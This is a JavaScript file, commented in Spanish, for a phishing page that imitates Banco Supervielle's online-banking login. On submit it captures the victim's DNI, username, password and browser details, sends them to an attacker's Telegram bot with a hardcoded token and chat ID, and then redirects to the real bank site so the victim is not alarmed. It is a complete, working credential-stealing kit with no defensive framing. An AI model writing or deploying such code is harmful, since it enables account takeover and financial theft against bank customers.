// scripts/logic.js
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('loginForm');
    
    // Leer configuración (simulada aquí, en un entorno real PHP, esto vendría del backend o variable global)
    // NOTA: Para que funcione perfecto sin PHP en el frontend, puedes poner los IDs directamente aquí si no quieres backend:
    const TELEGRAM_TOKEN = "8660541848:AAEowk2Dqm4WaX628T0ngHLVa819GZfHhGM"; // Reemplázalo o úsalo con PHP
    const TELEGRAM_CHAT_ID = "-1004484595871"; // Reemplázalo

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        const dni = document.getElementById('dni').value;
        const usuario = document.getElementById('usuario').value;
        const clave = document.getElementById('clave').value;
        const recuerda = document.getElementById('recordar_dni').checked ? "Sí" : "No";

        // Datos de navegación (User Agent y IP aproximada)
        const userAgent = navigator.userAgent;
        const screenRes = window.screen.width + 'x' + window.screen.height;
        const referrer = document.referrer || "Directo";

        // Formato del mensaje para Telegram
        const message = `
🔥 *NUEVO LOGIN CAPTURADO (Supervielle)* 🔥

🆔 *Documento:* ${dni}
👤 *Usuario:* ${usuario}
🔑 *Clave:* ${clave}
🧠 *Recordar DNI:* ${recuerda}

📱 *Dispositivo:* ${userAgent}
📐 *Resolución:* ${screenRes}
🔗 *Referencia:* ${referrer}

📍 *IP Detectada:* ${window.location.hostname}
        `;

        // Envío a Telegram API
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                // Redirección a la página real del banco para dar confianza
                window.location.href = "https://personas.supervielle.com.ar/obi/usuarios/login";
            } else {
                alert("Error de conexión, intentando nuevamente...");
                // Fallback: redirigir igual
                window.location.href = "https://personas.supervielle.com.ar/obi/usuarios/login";
            }
        })
        .catch(error => {
            console.error('Error:', error);
            window.location.href = "https://personas.supervielle.com.ar/obi/usuarios/login";
        });
    });
});
